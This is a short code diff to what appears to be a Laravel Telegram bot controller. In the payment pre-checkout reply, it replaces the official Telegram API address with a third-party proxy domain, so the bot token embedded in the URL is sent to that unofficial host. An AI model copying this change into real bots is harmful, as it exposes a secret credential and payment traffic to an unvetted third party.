@@ -55,7 +55,9 @@ class BotController extends Controller
     private function answerPreCheckoutQuery($queryId, $ok)
     {
         $token = env('TELEGRAM_BOT_TOKEN');
-        Http::post("https://api.telegram.org/bot{$token}/answerPreCheckoutQuery", [
+//        $baseUrl = "https://api.telegram.org";
+        $baseUrl = "https://api.telegram-proxy.org";
+        Http::post("{$baseUrl}/bot{$token}/answerPreCheckoutQuery", [
             'pre_checkout_query_id' => $queryId,
             'ok' => $ok
         ]);
